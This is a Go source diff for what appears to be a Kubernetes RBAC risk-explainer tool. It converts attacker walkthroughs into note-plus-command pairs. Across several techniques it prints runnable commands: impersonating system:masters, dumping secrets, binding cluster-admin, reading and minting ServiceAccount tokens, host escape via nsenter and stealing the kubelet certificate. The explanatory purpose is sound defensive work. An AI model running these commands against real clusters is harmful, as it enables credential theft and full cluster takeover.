@@ -22,14 +22,22 @@ type GlossaryEntry struct {
 	DocURL string        `json:"DocURL,omitempty"`
 }
 
+// AttackerStep is one entry in an attacker walkthrough. Note is plain-language description
+// (always shown). Cmd, when set, is the literal shell command — only Cmd lands in the
+// copyable code block, so a reader who clicks Copy gets a runnable string, not prose.
+type AttackerStep struct {
+	Note string `json:"Note,omitempty"`
+	Cmd  string `json:"Cmd,omitempty"`
+}
+
 // TechniqueExplainer describes one attacker technique in plain language. Plain renders as HTML
 // in the side-panel; AttackerSteps is rendered as an ordered list ("here is what an attacker
 // would actually run, in order").
 type TechniqueExplainer struct {
-	Title         string        `json:"Title"`
-	Plain         template.HTML `json:"Plain"`
-	Mitre         string        `json:"Mitre,omitempty"`
-	AttackerSteps []string      `json:"AttackerSteps,omitempty"`
+	Title         string         `json:"Title"`
+	Plain         template.HTML  `json:"Plain"`
+	Mitre         string         `json:"Mitre,omitempty"`
+	AttackerSteps []AttackerStep `json:"AttackerSteps,omitempty"`
 }
 
 // CategoryExplainer is the impact-lane copy. Plain explains what the category means in
@@ -192,56 +200,56 @@ var Techniques = map[string]TechniqueExplainer{
 		Title: "RBAC impersonation",
 		Plain: template.HTML(`<p>Kubernetes has a built-in "act as another user" feature — the <code>impersonate</code> verb on <code>users</code>, <code>groups</code>, or <code>serviceaccounts</code>. Anyone with that verb can submit requests as <em>any</em> identity, bypassing whatever permissions they don't have themselves.</p><p>Granting <code>impersonate</code> on <code>groups</code> = <code>["*"]</code> is equivalent to cluster-admin: the holder can impersonate <code>system:masters</code>.</p>`),
 		Mitre: "T1078.004 — Cloud Accounts",
-		AttackerSteps: []string{
-			"kubectl auth can-i --list --as=system:masters — confirm impersonation works",
-			"kubectl --as=system:masters get secrets -A — exfiltrate every secret",
-			"kubectl --as=system:masters create clusterrolebinding pwn --clusterrole=cluster-admin --user=attacker",
+		AttackerSteps: []AttackerStep{
+			{Note: "Confirm impersonation works", Cmd: "kubectl auth can-i --list --as=system:masters"},
+			{Note: "Exfiltrate every secret", Cmd: "kubectl --as=system:masters get secrets -A"},
+			{Note: "Pin permanent cluster-admin for an attacker-controlled user", Cmd: "kubectl --as=system:masters create clusterrolebinding pwn --clusterrole=cluster-admin --user=attacker"},
 		},
 	},
 	"bind_or_escalate": {
 		Title: "RBAC bind/escalate bypass",
 		Plain: template.HTML(`<p>RBAC has a guardrail: you can only grant permissions you yourself hold. Two verbs override that guardrail — <code>bind</code> (on a Role/ClusterRole) and <code>escalate</code> (also on Roles). Holding either lets the attacker create a binding to a Role they don't have themselves — including <code>cluster-admin</code>.</p>`),
 		Mitre: "T1098.003 — Account Manipulation: Additional Cloud Roles",
-		AttackerSteps: []string{
-			"kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=ns:me",
-			"kubectl get secrets -A — verify cluster-admin reach",
+		AttackerSteps: []AttackerStep{
+			{Note: "Bind a chosen ServiceAccount to cluster-admin", Cmd: "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=ns:me"},
+			{Note: "Verify cluster-admin reach", Cmd: "kubectl get secrets -A"},
 		},
 	},
 	"pod_create_token_theft": {
 		Title: "Pod creation → ServiceAccount token theft",
 		Plain: template.HTML(`<p>Anyone who can create pods in a namespace can mount any ServiceAccount in that namespace into the pod. Cluster-scoped pod-create lets you mount any ServiceAccount in <em>any</em> namespace. Once the pod is running, the attacker reads <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from inside it — and now holds a token for that SA.</p><p>This is the single most common privilege-escalation pattern in production Kubernetes.</p>`),
 		Mitre: "T1528 — Steal Application Access Token",
-		AttackerSteps: []string{
-			"kubectl run thief --image=alpine --serviceaccount=privileged-sa --command -- sleep infinity",
-			"kubectl exec thief -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
-			"Use the token: curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/...",
+		AttackerSteps: []AttackerStep{
+			{Note: "Spin up a pod that mounts the privileged ServiceAccount's token", Cmd: "kubectl run thief --image=alpine --serviceaccount=privileged-sa --command -- sleep infinity"},
+			{Note: "Read the mounted token from inside the pod", Cmd: "kubectl exec thief -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
+			{Note: "Call the API as the stolen ServiceAccount", Cmd: "curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/..."},
 		},
 	},
 	"pod_exec": {
 		Title: "Pod exec → container takeover",
 		Plain: template.HTML(`<p>The <code>pods/exec</code> subresource opens a shell inside a running container. If the container's pod uses a privileged ServiceAccount, the attacker inherits that SA's reach. If the container is itself privileged or mounts the host, this is also a node-escape primitive.</p>`),
 		Mitre: "T1611 — Escape to Host",
-		AttackerSteps: []string{
-			"kubectl exec -it <pod-with-privileged-sa> -- /bin/sh",
-			"cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+		AttackerSteps: []AttackerStep{
+			{Note: "Open a shell inside a pod whose ServiceAccount is privileged", Cmd: "kubectl exec -it <pod-with-privileged-sa> -- /bin/sh"},
+			{Note: "Read the mounted ServiceAccount token", Cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
 		},
 	},
 	"token_request": {
 		Title: "TokenRequest minting",
 		Plain: template.HTML(`<p>The <code>create</code> verb on <code>serviceaccounts/token</code> mints a fresh, valid token for any ServiceAccount in scope — no pod required. Cleaner than the pod-creation route and harder to spot in audit logs.</p>`),
 		Mitre: "T1528 — Steal Application Access Token",
-		AttackerSteps: []string{
-			"kubectl create token <sa> --duration=24h --bound-object-kind=Pod --bound-object-name=irrelevant",
-			"Use the token to call the API as <sa>",
+		AttackerSteps: []AttackerStep{
+			{Note: "Mint a fresh 24h token for any ServiceAccount in scope", Cmd: "kubectl create token <sa> --duration=24h --bound-object-kind=Pod --bound-object-name=irrelevant"},
+			{Note: "Call the API as the ServiceAccount using the minted token", Cmd: "curl --header 'Authorization: Bearer <token>' https://kubernetes.default.svc/api/..."},
 		},
 	},
 	"bound_to_cluster_admin": {
 		Title: "Direct cluster-admin binding",
 		Plain: template.HTML(`<p>The subject is bound directly to the <code>cluster-admin</code> ClusterRole through a ClusterRoleBinding. No chain needed — they are already cluster-admin. The only question is whether the subject itself can be compromised.</p>`),
 		Mitre: "T1078 — Valid Accounts",
-		AttackerSteps: []string{
-			"kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\") | .subjects'",
-			"Compromise any subject in that list — done.",
+		AttackerSteps: []AttackerStep{
+			{Note: "Enumerate every subject already bound to cluster-admin", Cmd: "kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\") | .subjects'"},
+			{Note: "Compromise any subject in that list — done."},
 		},
 	},
 	"wildcard_permission": {
@@ -253,16 +261,16 @@ var Techniques = map[string]TechniqueExplainer{
 		Title: "RoleBinding write access",
 		Plain: template.HTML(`<p><code>create</code>/<code>update</code>/<code>patch</code> on <code>rolebindings</code> or <code>clusterrolebindings</code> lets the attacker bind themselves to any role — typically cluster-admin. They don't need the role's permissions today, only the ability to change bindings.</p>`),
 		Mitre: "T1098 — Account Manipulation",
-		AttackerSteps: []string{
-			"kubectl patch clusterrolebinding existing-binding --type=json -p='[{\"op\":\"add\",\"path\":\"/subjects/-\",\"value\":{\"kind\":\"ServiceAccount\",\"name\":\"me\",\"namespace\":\"ns\"}}]'",
+		AttackerSteps: []AttackerStep{
+			{Note: "Append yourself as a subject on an existing high-privilege binding", Cmd: "kubectl patch clusterrolebinding existing-binding --type=json -p='[{\"op\":\"add\",\"path\":\"/subjects/-\",\"value\":{\"kind\":\"ServiceAccount\",\"name\":\"me\",\"namespace\":\"ns\"}}]'"},
 		},
 	},
 	"read_secrets": {
 		Title: "Secrets read access",
 		Plain: template.HTML(`<p><code>get</code>/<code>list</code>/<code>watch</code> on Secrets in kube-system or cluster-wide reads the controller-manager, scheduler, and node-bootstrap tokens — every credential needed to act as the control plane.</p>`),
 		Mitre: "T1552 — Unsecured Credentials",
-		AttackerSteps: []string{
-			"kubectl get secret -n kube-system -o json | jq -r '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token' | base64 -d",
+		AttackerSteps: []AttackerStep{
+			{Note: "Dump every ServiceAccount token stored in kube-system", Cmd: "kubectl get secret -n kube-system -o json | jq -r '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token' | base64 -d"},
 		},
 	},
 	"nodes_proxy": {
@@ -274,10 +282,10 @@ var Techniques = map[string]TechniqueExplainer{
 		Title: "Container escape to host",
 		Plain: template.HTML(`<p>The pod is configured in a way that makes escaping to the underlying node trivial: <code>privileged: true</code>, <code>hostPID</code>, <code>hostNetwork</code>, or a sensitive <code>hostPath</code> mount (root, docker.sock, etc.). An attacker who controls the container reaches root on the node, then has access to every pod and kubelet credential on that node.</p>`),
 		Mitre: "T1611 — Escape to Host",
-		AttackerSteps: []string{
-			"From inside the privileged pod: nsenter -t 1 -m -u -i -n -p — drop into PID 1's namespaces",
-			"Read /var/lib/kubelet/pki/kubelet-client-current.pem — node identity",
-			"Pivot to other pods on the same node via the container runtime socket",
+		AttackerSteps: []AttackerStep{
+			{Note: "From inside the privileged pod, drop into PID 1's namespaces on the host", Cmd: "nsenter -t 1 -m -u -i -n -p -- /bin/sh"},
+			{Note: "Steal the kubelet's client cert — the node's identity to the API server", Cmd: "cat /var/lib/kubelet/pki/kubelet-client-current.pem"},
+			{Note: "Pivot to other pods on the same node via the container runtime socket", Cmd: "crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps"},
 		},
 	},
 }
